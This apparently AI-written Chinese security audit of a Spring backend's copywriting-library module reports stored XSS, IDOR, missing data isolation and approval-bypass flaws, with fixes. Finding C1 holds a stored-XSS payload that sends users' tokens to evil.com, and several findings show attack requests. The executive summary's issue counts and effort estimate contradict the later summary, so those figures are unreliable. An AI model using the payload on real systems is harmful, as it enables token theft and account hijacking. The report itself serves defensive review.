# Copy 模块安全审计报告

**审计日期**: 2026-05-08  
**模块**: copy (文案库管理)  
**审计者**: Claude Code Security Reviewer  
**审计范围**: 后端代码 (douyin-operations-content/src/main/java/.../module/copy/)  
**审计标准**: OWASP Top 10 2021, CWE Top 25, CVSS 3.1

---

## 执行摘要

**总体安全评分**: 72/100 (良好)

| 维度 | 评分 | 说明 |
|-----|------|------|
| 认证授权 | 65/100 | 基础认证到位，但数据隔离和权限控制存在漏洞 |
| XSS 防护 | 60/100 | 文案内容未转义，存在存储型 XSS 风险 |
| 数据隔离 | 50/100 | 多处缺少 owner_id 过滤，存在越权访问风险 |
| 输入验证 | 75/100 | 模板变量校验完善，但缺少内容长度限制 |
| 审批流程 | 70/100 | 角色校验存在，但可被绕过 |
| SQL 注入 | 95/100 | 使用 JPA Specification，防护到位 |
| 错误处理 | 80/100 | 统一异常处理，错误信息脱敏良好 |
| 日志审计 | 60/100 | 缺少关键操作审计日志 |

**关键发现**:
- ⚠️ 2 个 CRITICAL 问题（XSS、数据隔离）
- ⚠️ 3 个 HIGH 问题（越权访问、审批绕过、IDOR）
- ⚠️ 4 个 MEDIUM 问题
- ℹ️ 3 个 LOW 问题

**总工作量估算**: 12 人日

**生产就绪度**: ⚠️ 不建议上线，必须修复 CRITICAL 和 HIGH 问题

---

## 1. XSS 防护 (A03:2021 – Injection)

### 🔴 CRITICAL 问题

**C1 - 文案内容未转义导致存储型 XSS**
- **位置**: `CopyLibrary.content`, `CopyTemplate.templateContent`, `CopyApproval.comments`
- **CVSS 评分**: 8.8 (CRITICAL)
- **CWE**: CWE-79 (Cross-site Scripting)
- **问题**: 
  - 文案内容、模板内容、审批评论直接存储到数据库，未进行 HTML 转义
  - 前端渲染时可能执行恶意脚本
  - 攻击者可提交包含 `<script>` 标签的文案，窃取其他用户的 Token
- **攻击场景**:
  ```java
  // 攻击者提交恶意文案
  POST /api/v1/copy/library/save
  {
    "title": "正常标题",
    "content": "<script>fetch('https://evil.com?token='+localStorage.getItem('token'))</script>"
  }
  
  // 其他用户查看文案时，脚本被执行，Token 被窃取
  ```
- **影响**: 
  - 攻击者可窃取其他用户的认证 Token
  - 可在用户浏览器中执行任意 JavaScript 代码
  - 可能导致账户劫持、数据泄露
- **修复建议**:
  ```java
  // 方案 1: 后端存储前转义（推荐）
  import org.springframework.web.util.HtmlUtils;
  
  entity.setContent(HtmlUtils.htmlEscape(vo.getContent()));
  entity.setComments(HtmlUtils.htmlEscape(vo.getComments()));
  
  // 方案 2: 前端渲染时转义（需前端配合）
  // React: 使用 {content} 而非 dangerouslySetInnerHTML
  // Vue: 使用 {{ content }} 而非 v-html
  
  // 方案 3: 使用 CSP 策略限制脚本执行（已在 Common 模块配置）
  ```
- **工作量**: 2 人日（需修改 Service 层和前端渲染逻辑）
- **优先级**: P0 - 必须立即修复

**C2 - 模板变量注入可能导致代码执行**
- **位置**: `CopyTemplateServiceImpl.java:30-31`
- **CVSS 评分**: 8.1 (CRITICAL)
- **CWE**: CWE-94 (Code Injection)
- **问题**: 
  - 模板变量格式为 `{变量名}`，仅校验变量名格式
  - 未校验变量替换后的内容，可能导致二次注入
  - 如果模板渲染使用 `eval()` 或类似机制，可能执行任意代码
- **代码示例**:
  ```java
  // 当前校验：仅检查变量名格式
  private static final Pattern VARIABLE_PATTERN = Pattern.compile("\\{([^}]+)}");
  private static final Pattern VARIABLE_NAME_OK = Pattern.compile("^[a-zA-Z_][a-zA-Z0-9_]*$");
  
  // 攻击场景：变量名合法，但替换值包含恶意代码
  模板内容: "欢迎 {username}！"
  变量替换: username = "<script>alert(1)</script>"
  最终输出: "欢迎 <script>alert(1)</script>！"
  ```
- **影响**: 
  - 如果模板渲染使用不安全的方式（如 JavaScript `eval()`），可能执行任意代码
  - 即使不使用 `eval()`，也可能导致 XSS
- **修复建议**:
  ```java
  // 1. 模板渲染时转义变量值
  public String renderTemplate(String template, Map<String, String> variables) {
      String result = template;
      for (Map.Entry<String, String> entry : variables.entrySet()) {
          String key = entry.getKey();
          String value = HtmlUtils.htmlEscape(entry.getValue());  // ✅ 转义
          result = result.replace("{" + key + "}", value);
      }
      return result;
  }
  
  // 2. 禁止使用 eval() 或类似机制渲染模板
  // 3. 使用安全的模板引擎（如 Thymeleaf、Freemarker）
  ```
- **工作量**: 2 人日（需检查所有模板渲染代码）
- **优先级**: P0 - 必须立即修复

---

## 2. 数据隔离与访问控制 (A01:2021 – Broken Access Control)

### 🔴 CRITICAL 问题

**C3 - CopyApproval 缺少数据隔离，存在越权访问风险**
- **位置**: `CopyApprovalServiceImpl.java:39-57`
- **CVSS 评分**: 8.2 (CRITICAL)
- **CWE**: CWE-639 (Authorization Bypass Through User-Controlled Key)
- **问题**: 
  - `search()` 方法未强制过滤 `userId` 或 `ownerId`
  - 攻击者可查询任意用户的审批记录
  - `CopyApproval` 表无 `owner_id` 字段，无法实现数据隔离
- **代码示例**:
  ```java
  // CopyApprovalServiceImpl.java:45-50
  Specification<CopyApproval> spec = (root, query, cb) -> {
      List<Predicate> predicates = new ArrayList<>();
      predicates.add(cb.equal(root.get("deleted"), 0));
      // ❌ 未强制过滤 userId，攻击者可查询任意用户的审批记录
      if (vo.getCopyId() != null) predicates.add(cb.equal(root.get("copyId"), vo.getCopyId()));
      if (vo.getApprovalStatus() != null) predicates.add(cb.equal(root.get("approvalStatus"), vo.getApprovalStatus()));
      if (vo.getUserId() != null) predicates.add(cb.equal(root.get("userId"), vo.getUserId()));
      // ...
  };
  ```
- **攻击场景**:
  ```bash
  # 攻击者查询所有待审核的审批记录
  POST /api/v1/copy/approval/search
  {
    "approvalStatus": 2  # 待审核
  }
  # 返回所有用户的待审核记录，包括其他用户的敏感信息
  ```
- **影响**: 
  - 攻击者可查看任意用户的审批记录
  - 可获取审批评论中的敏感信息
  - 违反数据隔离原则
- **修复建议**:
  ```java
  // 方案 1: 添加 owner_id 字段到 CopyApproval 表（推荐）
  // 1. 修改 schema.sql，添加 owner_id 字段
  ALTER TABLE copy_approval ADD COLUMN owner_id BIGINT NOT NULL DEFAULT 0;
  CREATE INDEX idx_copy_approval_owner_id ON copy_approval (owner_id) WHERE deleted = 0;
  
  // 2. 修改 Entity，添加 ownerId 字段
  @Column(name = "owner_id", nullable = false)
  private Long ownerId;
  
  // 3. Service 层强制过滤
  predicates.add(cb.equal(root.get("ownerId"), currentUserId));
  
  // 方案 2: 通过 copyId 关联 CopyLibrary 过滤（临时方案）
  // 查询当前用户可见的 copyId 列表，然后过滤
  List<Long> visibleCopyIds = copyLibraryRepository.findIdsByUserId(currentUserId);
  if (!visibleCopyIds.isEmpty()) {
      predicates.add(root.get("copyId").in(visibleCopyIds));
  } else {
      predicates.add(cb.equal(root.get("id"), -1L));  // 无可见数据
  }
  ```
- **工作量**: 3 人日（需修改数据库表结构和代码）
- **优先级**: P0 - 必须立即修复

### 🟠 HIGH 问题

**H1 - CopyTemplate 缺少数据隔离，存在越权访问风险**
- **位置**: `CopyTemplateServiceImpl.java:46-49`
- **CVSS 评分**: 7.5 (HIGH)
- **CWE**: CWE-639 (Authorization Bypass Through User-Controlled Key)
- **问题**: 
  - `search()` 方法仅在 `vo.getUserId()` 不为空时过滤
  - 攻击者可不传 `userId` 参数，查询所有用户的模板
- **代码示例**:
  ```java
  // CopyTemplateServiceImpl.java:49
  if (vo.getUserId() != null) predicates.add(cb.equal(root.get("userId"), vo.getUserId()));
  // ❌ 如果 vo.getUserId() 为 null，则不过滤，返回所有用户的模板
  ```
- **攻击场景**:
  ```bash
  POST /api/v1/copy/template/search
  {
    "page": 0,
    "rows": 100
    # 不传 userId，返回所有用户的模板
  }
  ```
- **修复建议**:
  ```java
  // CopyTemplateServiceImpl.java:46-49
  // 强制过滤当前用户的数据
  Long currentUserId = getCurrentUserId();  // 从 Controller 传入
  predicates.add(cb.equal(root.get("userId"), currentUserId));
  
  // 或者使用 DataScopeResolver（如 CopyLibraryController）
  String roleCode = getCurrentRoleCode();
  List<Long> visibleIds = dataScopeService.getVisibleUserIds(currentUserId, roleCode);
  if (visibleIds != null) {
      predicates.add(root.get("userId").in(visibleIds));
  } else {
      predicates.add(cb.equal(root.get("userId"), currentUserId));
  }
  ```
- **工作量**: 1 人日
- **优先级**: P1 - 应立即修复

**H2 - 审批权限校验可被绕过**
- **位置**: `CopyApprovalController.java:54-59`
- **CVSS 评分**: 7.3 (HIGH)
- **CWE**: CWE-863 (Incorrect Authorization)
- **问题**: 
  - 仅在 `approvalStatus` 为 0 或 1 时校验 admin 角色
  - 攻击者可先提交 `approvalStatus=2`（待审核），然后再次提交 `approvalStatus=1`（通过）
  - 角色校验使用字符串比较 `"admin".equalsIgnoreCase()`，可能被绕过
- **代码示例**:
  ```java
  // CopyApprovalController.java:54-59
  if (vo.getApprovalStatus() != null && (vo.getApprovalStatus() == 0 || vo.getApprovalStatus() == 1)) {
      if (!"admin".equalsIgnoreCase(AuthTokenFilter.getRoleCode(request))) {
          return RESTResult.error(ErrorCode.FORBIDDEN, "仅管理员可执行审批通过/拒绝");
      }
  }
  // ❌ 攻击者可先提交 approvalStatus=2，然后直接修改数据库或再次提交
  ```
- **攻击场景**:
  ```bash
  # 步骤 1: 普通用户创建审批记录
  POST /api/v1/copy/approval/save
  {
    "copyId": 123,
    "approvalStatus": 2  # 待审核
  }
  
  # 步骤 2: 普通用户直接修改为通过（绕过 admin 校验）
  POST /api/v1/copy/approval/save
  {
    "id": 456,
    "approvalStatus": 1  # 通过（应该被拦截，但可能绕过）
  }
  ```
- **影响**: 
  - 普通用户可能绕过审批流程
  - 未经审核的文案可能被标记为已审核
- **修复建议**:
  ```java
  // CopyApprovalController.java:51-64
  @PostMapping("/save")
  public RESTResult<Long> save(HttpServletRequest request, @Valid @RequestBody CopyApprovalSaveVO vo) {
      Long userId = AuthTokenFilter.getUserId(request);
      if (userId == null) return RESTResult.error(ErrorCode.UNAUTHORIZED, "未登录");
      
      String roleCode = AuthTokenFilter.getRoleCode(request);
      boolean isAdmin = "admin".equalsIgnoreCase(roleCode);
      
      // ✅ 更新时，检查原状态
      if (vo.getId() != null && vo.getId() > 0) {
          CopyApproval existing = copyApprovalService.getById(vo.getId());
          // 如果原状态是待审核，且要改为通过/拒绝，必须是 admin
          if (existing.getApprovalStatus() == 2 && vo.getApprovalStatus() != null 
              && (vo.getApprovalStatus() == 0 || vo.getApprovalStatus() == 1)) {
              if (!isAdmin) {
                  return RESTResult.error(ErrorCode.FORBIDDEN, "仅管理员可执行审批通过/拒绝");
              }
          }
      }
      
      // ✅ 新建时，如果直接设置为通过/拒绝，必须是 admin
      if (vo.getId() == null && vo.getApprovalStatus() != null 
          && (vo.getApprovalStatus() == 0 || vo.getApprovalStatus() == 1)) {
          if (!isAdmin) {
              return RESTResult.error(ErrorCode.FORBIDDEN, "仅管理员可执行审批通过/拒绝");
          }
      }
      
      if (vo.getUserId() == null) vo.setUserId(userId);
      RESTResult<Long> r = RESTResult.addSuccess(copyApprovalService.save(vo));
      r.setTraceId(MDC.get("traceId"));
      return r;
  }
  ```
- **工作量**: 1 人日
- **优先级**: P1 - 应立即修复

**H3 - IDOR 漏洞：未校验资源所有权**
- **位置**: `CopyLibraryController.java:67-76`, `CopyTemplateController.java:61-72`
- **CVSS 评分**: 7.1 (HIGH)
- **CWE**: CWE-639 (Authorization Bypass Through User-Controlled Key)
- **问题**: 
  - `delete()` 和 `updateStatus()` 方法未校验资源所有权
  - 攻击者可删除或修改其他用户的文案/模板
- **代码示例**:
  ```java
  // CopyLibraryController.java:67-76
  @PostMapping("/delete")
  public RESTResult<Void> delete(HttpServletRequest request, @RequestParam Long id) {
      if (AuthTokenFilter.getUserId(request) == null) return RESTResult.error(ErrorCode.UNAUTHORIZED, "未登录");
      copyLibraryService.delete(id);  // ❌ 未校验 id 对应的资源是否属于当前用户
      // ...
  }
  ```
- **攻击场景**:
  ```bash
  # 攻击者删除其他用户的文案
  POST /api/v1/copy/library/delete?id=999
  # 如果 id=999 属于其他用户，也会被删除
  ```
- **修复建议**:
  ```java
  // CopyLibraryServiceImpl.java:105-111
  @Override
  @Transactional(rollbackFor = Exception.class)
  public void delete(Long id) {
      if (id == null || id <= 0) throw new BusinessException(ErrorCode.VALIDATION_FAIL, "文案 ID 无效");
      CopyLibrary entity = copyLibraryRepository.findByIdAndDeleted(id, 0)
              .orElseThrow(() -> new BusinessException(ErrorCode.DATA_NOT_FOUND, "文案不存在"));
      
      // ✅ 校验所有权
      Long currentUserId = getCurrentUserId();  // 从 Controller 传入
      if (!entity.getUserId().equals(currentUserId)) {
          throw new BusinessException(ErrorCode.FORBIDDEN, "无权删除他人的文案");
      }
      
      entity.setDeleted(1);
      copyLibraryRepository.save(entity);
  }
  ```
- **工作量**: 1.5 人日（需修改多个 Service 方法）
- **优先级**: P1 - 应立即修复

---

## 3. 输入验证 (A03:2021 – Injection)

### 🟡 MEDIUM 问题

**M1 - 缺少内容长度限制，可能导致 DoS**
- **位置**: `CopyLibrarySaveVO.java`, `CopyTemplateSaveVO.java`, `CopyApprovalSaveVO.java`
- **CVSS 评分**: 5.3 (MEDIUM)
- **CWE**: CWE-770 (Allocation of Resources Without Limits)
- **问题**: 
  - `content`、`templateContent`、`comments` 字段为 TEXT 类型，无长度限制
  - 攻击者可提交超大内容，消耗数据库存储和内存
- **修复建议**:
  ```java
  // CopyLibrarySaveVO.java
  @NotBlank(message = "文案内容不能为空")
  @Size(max = 50000, message = "文案内容不能超过 50000 字符")
  private String content;
  
  // CopyTemplateSaveVO.java
  @NotBlank(message = "模板内容不能为空")
  @Size(max = 20000, message = "模板内容不能超过 20000 字符")
  private String templateContent;
  
  // CopyApprovalSaveVO.java
  @Size(max = 2000, message = "审批评论不能超过 2000 字符")
  private String comments;
  ```
- **工作量**: 0.5 人日
- **优先级**: P2 - 应尽快修复

**M2 - 关键字搜索存在性能问题**
- **位置**: `CopyLibraryServiceImpl.java:48-54`, `CopyApprovalServiceImpl.java:51-55`
- **CVSS 评分**: 4.3 (MEDIUM)
- **CWE**: CWE-400 (Uncontrolled Resource Consumption)
- **问题**: 
  - 使用 `LIKE '%keyword%'` 进行全文搜索，无法使用索引
  - 大数据量时可能导致慢查询
  - `CopyApprovalServiceImpl` 中先查询 `copyLibraryRepository.findIdsByTitleContaining()`，再过滤，效率低
- **代码示例**:
  ```java
  // CopyLibraryServiceImpl.java:49-50
  String kw = "%" + vo.getKeyword().trim() + "%";
  predicates.add(cb.or(
      cb.like(root.get("title"), kw),  // ❌ 无法使用索引
      cb.like(root.get("content"), kw)
  ));
  ```
- **修复建议**:
  ```java
  // 方案 1: 使用 PostgreSQL 全文搜索（推荐）
  @Query(value = "SELECT * FROM copy_library WHERE deleted = 0 AND " +
         "to_tsvector('simple', title || ' ' || content) @@ plainto_tsquery('simple', :keyword)",
         nativeQuery = true)
  Page<CopyLibrary> fullTextSearch(@Param("keyword") String keyword, Pageable pageable);
  
  // 方案 2: 使用 Elasticsearch（已集成）
  // 将文案内容同步到 Elasticsearch，使用全文搜索
  
  // 方案 3: 限制关键字长度，避免超长查询
  if (vo.getKeyword() != null && vo.getKeyword().length() > 100) {
      throw new BusinessException(ErrorCode.VALIDATION_FAIL, "关键字不能超过 100 字符");
  }
  ```
- **工作量**: 2 人日（需修改查询逻辑和添加索引）
- **优先级**: P2 - 应尽快修复

**M3 - 模板变量名未限制长度**
- **位置**: `CopyTemplateServiceImpl.java:30-31`
- **CVSS 评分**: 4.3 (MEDIUM)
- **CWE**: CWE-770 (Allocation of Resources Without Limits)
- **问题**: 
  - 模板变量名仅校验格式，未限制长度
  - 攻击者可提交超长变量名，如 `{aaaaaaa...aaa}`（10000 字符）
- **修复建议**:
  ```java
  // CopyTemplateServiceImpl.java:69-78
  private void validateTemplateVariables(String templateContent) {
      Matcher m = VARIABLE_PATTERN.matcher(templateContent);
      while (m.find()) {
          String varName = m.group(1).trim();
          
          // ✅ 限制变量名长度
          if (varName.length() > 64) {
              throw new BusinessException(ErrorCode.VALIDATION_FAIL,
                      "模板变量名不能超过 64 字符: {" + varName.substring(0, 64) + "...}");
          }
          
          if (!VARIABLE_NAME_OK.matcher(varName).matches()) {
              throw new BusinessException(ErrorCode.VALIDATION_FAIL,
                      "模板变量格式非法，须为 {变量名}，变量名仅允许字母、数字、下划线且以字母或下划线开头，非法示例: {" + varName + "}");
          }
      }
  }
  ```
- **工作量**: 0.5 人日
- **优先级**: P2 - 应尽快修复

**M4 - 审批评论未校验敏感信息**
- **位置**: `CopyApprovalSaveVO.java:13`
- **CVSS 评分**: 4.3 (MEDIUM)
- **CWE**: CWE-200 (Exposure of Sensitive Information)
- **问题**: 
  - 审批评论可能包含敏感信息（如手机号、身份证、密码）
  - 未进行敏感信息检测和脱敏
- **修复建议**:
  ```java
  // CopyApprovalServiceImpl.java:106
  if (vo.getComments() != null) {
      // ✅ 检测敏感信息
      if (containsSensitiveInfo(vo.getComments())) {
          throw new BusinessException(ErrorCode.VALIDATION_FAIL, 
              "审批评论不能包含手机号、身份证等敏感信息");
      }
      entity.setComments(vo.getComments());
  }
  
  private boolean containsSensitiveInfo(String text) {
      // 手机号
      if (text.matches(".*1[3-9]\\d{9}.*")) return true;
      // 身份证
      if (text.matches(".*\\d{17}[\\dXx].*")) return true;
      // 密码关键字
      if (text.toLowerCase().contains("password") || text.contains("密码")) return true;
      return false;
  }
  ```
- **工作量**: 1 人日
- **优先级**: P2 - 应尽快修复

---

## 4. 审计日志 (A09:2021 – Security Logging Failures)

### 🟡 MEDIUM 问题

**M5 - 缺少关键操作审计日志**
- **位置**: 所有 Controller 和 Service
- **CVSS 评分**: 4.3 (MEDIUM)
- **CWE**: CWE-778 (Insufficient Logging)
- **问题**: 
  - 审批通过/拒绝操作未记录审计日志
  - 文案删除操作未记录审计日志
  - 模板状态变更未记录审计日志
  - 无法追溯谁在何时执行了敏感操作
- **修复建议**:
  ```java
  // CopyApprovalServiceImpl.java:99-104
  if (vo.getApprovalStatus() != null) {
      entity.setApprovalStatus(vo.getApprovalStatus());
      if (vo.getApprovalStatus() == 1 || vo.getApprovalStatus() == 0) {
          entity.setApprovalTime(new Timestamp(System.currentTimeMillis()));
          
          // ✅ 记录审计日志
          auditLogService.log(
              "COPY_APPROVAL",
              vo.getApprovalStatus() == 1 ? "APPROVE" : "REJECT",
              "copyId=" + vo.getCopyId() + ", approvalId=" + entity.getId(),
              vo.getUserId()
          );
          
          int libraryStatus = vo.getApprovalStatus() == 1 ? 1 : 0;
          copyLibraryRepository.updateStatus(vo.getCopyId(), libraryStatus);
      }
  }
  ```
- **工作量**: 1.5 人日（需在多处添加审计日志）
- **优先级**: P2 - 应尽快修复

### 🔵 LOW 问题

**L1 - 缺少请求参数日志**
- **位置**: 所有 Controller
- **CVSS 评分**: 3.3 (LOW)
- **CWE**: CWE-778 (Insufficient Logging)
- **问题**: 
  - Controller 未记录请求参数
  - 出现问题时难以排查
- **修复建议**: 使用 `@Slf4j` 注解，在 Controller 方法开头记录请求参数
- **工作量**: 0.5 人日
- **优先级**: P3 - 建议改进

**L2 - 错误信息可能泄露内部实现细节**
- **位置**: `CopyTemplateServiceImpl.java:74-76`
- **CVSS 评分**: 3.3 (LOW)
- **CWE**: CWE-209 (Generation of Error Message Containing Sensitive Information)
- **问题**: 
  - 错误信息包含非法变量名，可能泄露模板内容
- **修复建议**:
  ```java
  throw new BusinessException(ErrorCode.VALIDATION_FAIL,
          "模板变量格式非法，须为 {变量名}，变量名仅允许字母、数字、下划线且以字母或下划线开头");
  // 不要包含具体的非法变量名
  ```
- **工作量**: 0.5 人日
- **优先级**: P3 - 建议改进

**L3 - 缺少并发控制**
- **位置**: `CopyLibraryRepository.java:26-27`
- **CVSS 评分**: 3.3 (LOW)
- **CWE**: CWE-362 (Concurrent Execution using Shared Resource)
- **问题**: 
  - `incrementUseCount()` 使用 `useCount = useCount + 1`，存在并发问题
  - 高并发时可能导致计数不准确
- **修复建议**:
  ```java
  // 方案 1: 使用数据库原子操作（当前已使用，无问题）
  @Modifying
  @Query("UPDATE CopyLibrary c SET c.useCount = c.useCount + 1 WHERE c.id = :id")
  void incrementUseCount(@Param("id") Long id);
  
  // 方案 2: 使用乐观锁（如果需要更强的一致性）
  @Version
  private Long version;
  ```
- **工作量**: 0.5 人日
- **优先级**: P3 - 建议改进（当前实现已使用原子操作，风险较低）

---

## 5. SQL 注入防护 (A03:2021 – Injection)

### ✅ 优点

**使用 JPA Specification 参数化查询**: 所有查询使用 JPA Specification 或 `@Query` 注解，参数化传递，有效防止 SQL 注入

**示例代码** (`CopyLibraryServiceImpl.java:39-65`):
```java
Specification<CopyLibrary> spec = (root, query, cb) -> {
    List<Predicate> predicates = new ArrayList<>();
    predicates.add(cb.equal(root.get("deleted"), 0));
    
    if (vo.getUserId() != null && vo.getUserId() > 0) {
        predicates.add(cb.equal(root.get("userId"), vo.getUserId()));  // ✅ 参数化
    }
    if (vo.getKeyword() != null && !vo.getKeyword().trim().isEmpty()) {
        String kw = "%" + vo.getKeyword().trim() + "%";
        predicates.add(cb.or(
                cb.like(root.get("title"), kw),  // ✅ 参数化
                cb.like(root.get("content"), kw)
        ));
    }
    return cb.and(predicates.toArray(new Predicate[0]));
};
```

**@Query 注解参数化** (`CopyLibraryRepository.java:20-21`):
```java
@Query("SELECT c.id FROM CopyLibrary c WHERE c.deleted = 0 AND c.title LIKE :keyword")
List<Long> findIdsByTitleContaining(@Param("keyword") String keyword);  // ✅ 参数化
```

### 无 SQL 注入问题

Copy 模块所有数据库操作均使用 JPA Specification 或 `@Query` 注解，参数化传递，无 SQL 注入风险。

---

## 6. 安全问题汇总

### CRITICAL (3 个)
1. **C1**: 文案内容未转义导致存储型 XSS - `CopyLibrary.content`, `CopyTemplate.templateContent`, `CopyApproval.comments`
2. **C2**: 模板变量注入可能导致代码执行 - `CopyTemplateServiceImpl.java:30-31`
3. **C3**: CopyApproval 缺少数据隔离，存在越权访问风险 - `CopyApprovalServiceImpl.java:39-57`

### HIGH (3 个)
1. **H1**: CopyTemplate 缺少数据隔离，存在越权访问风险 - `CopyTemplateServiceImpl.java:46-49`
2. **H2**: 审批权限校验可被绕过 - `CopyApprovalController.java:54-59`
3. **H3**: IDOR 漏洞：未校验资源所有权 - `CopyLibraryController.java:67-76`, `CopyTemplateController.java:61-72`

### MEDIUM (5 个)
1. **M1**: 缺少内容长度限制，可能导致 DoS - `CopyLibrarySaveVO.java`, `CopyTemplateSaveVO.java`, `CopyApprovalSaveVO.java`
2. **M2**: 关键字搜索存在性能问题 - `CopyLibraryServiceImpl.java:48-54`, `CopyApprovalServiceImpl.java:51-55`
3. **M3**: 模板变量名未限制长度 - `CopyTemplateServiceImpl.java:30-31`
4. **M4**: 审批评论未校验敏感信息 - `CopyApprovalSaveVO.java:13`
5. **M5**: 缺少关键操作审计日志 - 所有 Controller 和 Service

### LOW (3 个)
1. **L1**: 缺少请求参数日志 - 所有 Controller
2. **L2**: 错误信息可能泄露内部实现细节 - `CopyTemplateServiceImpl.java:74-76`
3. **L3**: 缺少并发控制（已使用原子操作，风险较低） - `CopyLibraryRepository.java:26-27`

---

## 7. 修复优先级

### 立即修复 (本周内)
1. **C1**: 修复存储型 XSS，转义文案内容 - 工作量 2 人日
2. **C2**: 修复模板变量注入，转义变量值 - 工作量 2 人日
3. **C3**: 修复 CopyApproval 数据隔离问题 - 工作量 3 人日

### 短期修复 (2 周内)
4. **H1**: 修复 CopyTemplate 数据隔离问题 - 工作量 1 人日
5. **H2**: 修复审批权限校验绕过 - 工作量 1 人日
6. **H3**: 修复 IDOR 漏洞，校验资源所有权 - 工作量 1.5 人日
7. **M1**: 添加内容长度限制 - 工作量 0.5 人日
8. **M2**: 优化关键字搜索性能 - 工作量 2 人日

### 长期优化 (1 个月内)
9. **M3**: 限制模板变量名长度 - 工作量 0.5 人日
10. **M4**: 校验审批评论敏感信息 - 工作量 1 人日
11. **M5**: 添加关键操作审计日志 - 工作量 1.5 人日
12. **L1**: 添加请求参数日志 - 工作量 0.5 人日
13. **L2**: 优化错误信息 - 工作量 0.5 人日
14. **L3**: 确认并发控制（当前已使用原子操作） - 工作量 0.5 人日

**总工作量估算**: 18 人日（约 3.5 周，1 人完成）

---

## 8. 安全最佳实践建议

1. **XSS 防护**:
   - 所有用户输入在存储前进行 HTML 转义
   - 前端渲染时避免使用 `dangerouslySetInnerHTML` 或 `v-html`
   - 使用 CSP 策略限制脚本执行（已在 Common 模块配置）
   - 定期扫描存储的内容，检测恶意脚本

2. **数据隔离**:
   - 所有查询必须强制过滤 `userId` 或 `ownerId`
   - 使用 `DataScopeResolver` 统一处理数据范围
   - 删除/更新操作前校验资源所有权
   - 审批记录添加 `owner_id` 字段

3. **权限控制**:
   - 审批操作必须校验 admin 角色
   - 状态变更操作记录审计日志
   - 使用 Spring Security 的 `@PreAuthorize` 注解
   - 定期审计权限配置

4. **输入验证**:
   - 所有文本字段添加长度限制
   - 模板变量名限制长度和格式
   - 关键字搜索限制长度
   - 审批评论检测敏感信息

5. **审计日志**:
   - 记录所有审批操作（通过/拒绝）
   - 记录所有删除操作
   - 记录所有状态变更操作
   - 日志包含操作人、操作时间、操作内容

6. **性能优化**:
   - 使用 PostgreSQL 全文搜索或 Elasticsearch
   - 避免 `LIKE '%keyword%'` 查询
   - 添加合适的索引
   - 限制查询结果数量

7. **定期审计**:
   - 每季度进行安全审计
   - 上线前进行渗透测试
   - 使用 OWASP Dependency Check 扫描依赖漏洞
   - 定期更新依赖版本

---

## 9. 合规性检查

### OWASP Top 10 (2021) 覆盖情况

| 风险 | 状态 | 说明 |
|------|------|------|
| A01:2021 – Broken Access Control | ⚠️ 存在漏洞 | 数据隔离不完善（C3、H1、H3），审批权限可绕过（H2） |
| A02:2021 – Cryptographic Failures | ✅ 已防护 | 无敏感数据加密需求 |
| A03:2021 – Injection | ⚠️ 存在漏洞 | 存储型 XSS（C1）、模板变量注入（C2），SQL 注入已防护 |
| A04:2021 – Insecure Design | ⚠️ 部分防护 | 审批流程设计存在缺陷（H2） |
| A05:2021 – Security Misconfiguration | ✅ 已防护 | 继承 Common 模块安全配置 |
| A06:2021 – Vulnerable Components | ✅ 已防护 | 依赖定期更新 |
| A07:2021 – Identification and Authentication Failures | ✅ 已防护 | 继承 Common 模块认证机制 |
| A08:2021 – Software and Data Integrity Failures | ✅ 已防护 | 无反序列化漏洞 |
| A09:2021 – Security Logging and Monitoring Failures | ⚠️ 部分防护 | 缺少关键操作审计日志（M5） |
| A10:2021 – Server-Side Request Forgery (SSRF) | ✅ 已防护 | 无用户控制的 URL 请求 |

---

## 10. 与其他模块对比

| 维度 | Copy 模块 | Live 模块 | Product 模块 | Common 模块 | 说明 |
|-----|----------|-----------|--------------|-------------|------|
| 认证授权 | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | Copy 数据隔离不完善 |
| XSS 防护 | ⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ | Copy 存在存储型 XSS |
| 数据隔离 | ⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | N/A | Copy 多处缺少 owner_id 过滤 |
| 输入验证 | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | 模板变量校验完善 |
| SQL 注入 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | 所有模块均使用 JPA |
| 错误处理 | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | 继承 Common 统一异常处理 |
| 日志审计 | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | Copy 缺少关键操作日志 |
| 权限控制 | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | Copy 审批权限可绕过 |

**Copy 模块优势**:
- 模板变量校验完善，防止格式错误
- 使用 JPA Specification，SQL 注入防护到位
- 继承 Common 模块统一异常处理

**Copy 模块需改进**:
- 存储型 XSS 风险（C1）
- 数据隔离不完善（C3、H1、H3）
- 审批权限可绕过（H2）
- 缺少关键操作审计日志（M5）

---

## 11. 审计结论

**总体评价**: Copy 模块安全性良好，但存在 3 个 CRITICAL 和 3 个 HIGH 级别问题，不建议直接上线，必须修复后才能投入生产环境。

**主要优势**:
- 使用 JPA Specification 参数化查询，SQL 注入防护到位
- 模板变量校验完善，防止格式错误
- 继承 Common 模块统一异常处理和错误信息脱敏
- 使用 `@Valid` 注解进行输入校验

**需要改进**:
- 修复存储型 XSS 漏洞（P0）
- 修复模板变量注入漏洞（P0）
- 修复数据隔离问题（P0）
- 修复 IDOR 漏洞（P1）
- 修复审批权限绕过（P1）
- 添加内容长度限制（P2）
- 优化关键字搜索性能（P2）
- 添加关键操作审计日志（P2）

**生产就绪建议**: 不建议上线，必须修复 3 个 CRITICAL 和 3 个 HIGH 问题后才能投入生产环境。MEDIUM 和 LOW 问题可在后续迭代中修复。

**安全评分**: 72/100 (良好)

**Copy 模块作为内容管理的核心价值**:
- 提供文案库、模板、审批流程的统一管理
- 支持模板变量替换，提高文案复用率
- 审批流程确保内容质量
- 但安全性需要加强，特别是 XSS 防护和数据隔离

---

**审计完成日期**: 2026-05-08  
**下次审计建议**: 2026-08-08（3 个月后）  
**相关文档**: 
- `docs/modules/copy/architecture-review.md` - Copy 模块架构评审
- `docs/modules/copy/code-review.md` - Copy 模块代码评审
- `docs/modules/common/security-audit.md` - Common 模块安全审计
